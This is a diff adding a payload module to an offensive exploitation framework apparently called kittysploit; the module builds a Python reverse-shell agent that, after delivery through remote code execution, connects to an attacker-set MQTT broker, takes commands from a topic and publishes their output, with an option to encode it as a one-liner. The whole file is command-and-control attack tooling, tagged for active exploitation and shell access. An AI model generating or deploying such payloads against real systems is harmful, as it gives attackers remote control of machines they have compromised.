@@ -1,0 +1,79 @@
+from kittysploit import *
+
+from lib.c2.mqtt_reverse_agent import build_mqtt_reverse_agent_script
+
+
+class Module(Payload):
+	"""MQTT reverse shell agent — deliverable via RCE like HTTP polling."""
+
+	CLIENT_LANGUAGE = "python"
+
+	__info__ = {
+		"name": "Python MQTT Reverse Shell",
+		"description": (
+			"Connect to an MQTT broker, subscribe to cmd topic, publish results "
+			"(stdlib MQTT 3.1.1 — no paho required on target). "
+			"Pairs with listeners/iot/reverse_mqtt_shell."
+		),
+		"category": PayloadCategory.CMD,
+		"arch": Arch.PYTHON,
+		"platform": Platform.MULTI,
+		"listener": "listeners/iot/reverse_mqtt_shell",
+		"handler": Handler.REVERSE,
+		"session_type": SessionType.POLLING,
+		"tags": ["iot", "mqtt", "c2"],
+		"agent": {
+			"risk": "intrusive",
+			"effects": ["active_exploitation"],
+			"produces": ["risk_signals"],
+			"chain": {
+				"produces_capabilities": ["shell", "mqtt_access"],
+				"suggested_followups": [
+					"post/mqtt/gather/topic_dump",
+					"post/mqtt/gather/broker_audit",
+				],
+			},
+		},
+	}
+
+	lhost = OptString("127.0.0.1", "MQTT broker host", True)
+	lport = OptPort(1883, "MQTT broker port", True)
+	client_id = OptString("", "Agent MQTT / session client ID", False)
+	base_topic = OptString("kittysploit/c2", "Base topic (must match listener)", False)
+	username = OptString("", "Broker username", False)
+	password = OptString("", "Broker password", False)
+	python_binary = OptString("python3", "Python on target", True)
+	output_format = OptChoice(
+		"oneliner",
+		"oneliner = python -c exec; script = raw Python source",
+		False,
+		choices=["oneliner", "script"],
+	)
+
+	def generate(self):
+		identity = None
+		if hasattr(self, "_apply_implant_identity_options"):
+			try:
+				identity = self._apply_implant_identity_options()
+			except Exception:
+				identity = None
+		cid = str(getattr(getattr(self, "client_id", None), "value", self.client_id) or "").strip()
+		if identity and getattr(identity, "implant_id", None):
+			cid = identity.implant_id
+		elif not cid:
+			cid = "mqtt1"
+
+		script = build_mqtt_reverse_agent_script(
+			str(self.lhost),
+			int(self.lport),
+			cid,
+			base_topic=str(self.base_topic or "kittysploit/c2"),
+			username=str(self.username or ""),
+			password=str(self.password or ""),
+		)
+		fmt = str(
+			getattr(getattr(self, "output_format", None), "value", self.output_format) or "oneliner"
+		).strip().lower()
+		if fmt == "script":
+			return self._finalize_python_script(script)
+		return self._encode_python_one_liner(script, self.python_binary)
